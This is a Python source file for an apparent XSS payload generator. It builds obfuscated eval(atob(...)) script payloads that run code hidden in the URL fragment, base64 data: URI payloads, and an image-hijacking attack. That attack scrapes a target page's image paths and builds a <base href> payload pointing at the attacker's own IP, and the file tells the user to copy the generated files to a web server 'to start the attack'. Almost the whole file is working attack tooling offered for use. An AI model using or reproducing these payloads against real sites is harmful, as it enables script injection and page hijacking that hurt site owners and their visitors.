# By Martin v1.0.0

import base64,random,re,requests,os,shutil,time,socket
from Random_User_Agent import Random_User_Agent

class XSS_Construction():
    def __init__(self):
        self.user_agnet=Random_User_Agent()

    def Fake_Method(self, data):  # Pseudo Protocol XSS
        return f"data:text/html;base64,{base64.b64encode(data.encode('utf-8')).decode('utf-8')}"

    def URL_Method(self, url, js_data):  # URL FileCode
        payload1 = f"location.hash='#{base64.b64encode(js_data.encode('utf-8')).decode('utf-8')}';" + f"eval(atob('{base64.b64encode('eval(unescape(atob(location.hash.substr(1))))'.encode('utf-8')).decode('utf-8')}'))"
        payload1 = f"<script>eval(atob('" + base64.b64encode(payload1.encode('utf-8')).decode('utf-8') + "'))</script>"
        payload2 = f"<script>eval(atob('{base64.b64encode('eval(unescape(atob(location.hash.substr(1))))'.encode('utf-8')).decode('utf-8')}'))</script>"
        payload_url = url + "#" + base64.b64encode(js_data.encode('utf-8')).decode('utf-8')
        return payload_url, payload2, payload1
    #   Manual_triggering_URL  Manual_triggering  Automatic_triggering

    def Image_hijacking_Method(self, url, image_path): # URL ImageName
        if self.__Check_Par__(url,image_path):
            time_str = str(time.time())
            src = self.__Got_Url_Image_Data(url)
            self.__Image_Dir__(time_str, src, image_path)
            return f"XSS-Payload:<base href='http://{self.__Get_IP__()}'>",f"Copy all files in the ./{time_str}/ directory to your web server to start the attack"
        else:
            return None,None


    def __Check_Par__(self,url,path):
        try:
            requests.get(url,headers={'User-Agnet': self.user_agnet.Random_UA()})
        except Exception as e:
            print(e)
            print("Network Error!")
            return False
        else:
            pattern = re.compile(r'^(https?://).*')
            if pattern.match(url) and os.path.exists(path):
                return True
            print("Parameter abnormality!")
            return False


    def __Image_Dir__(self, times, src, image_path):
        for i in src:
            dir_path = os.path.join(times, ('/'.join(i.split('/')[:-1]) if not '/'.join(i.split('/')[:-1]).startswith('/') else '/'.join(i.split('/')[:-1])), '')
            self.__Create__(dir_path)
            shutil.copy(image_path, os.path.join(dir_path, i.split('/')[-1]))


    def __Got_Url_Image_Data(self, url):
        source = requests.get(url, headers={'User-Agnet': self.user_agnet.Random_UA()}).text
        img_pattern = re.compile(r'<img.*?src="(?!http|https)(/|\./|''.*?)".*?>')
        img_links = img_pattern.findall(source)
        return img_links


    def __Create__(self, path):
        try:
            os.makedirs(path, exist_ok=True)
        except Exception as e:
            print(e)


    def __Get_IP__(self):
        if socket.gethostbyname(socket.gethostname()).startswith('127'):
            return os.popen("ifconfig eth0 | awk -F \"[^0-9.]+\" 'NR==2{print $2}'").read().strip()
        else:
            return socket.gethostbyname(socket.gethostname())
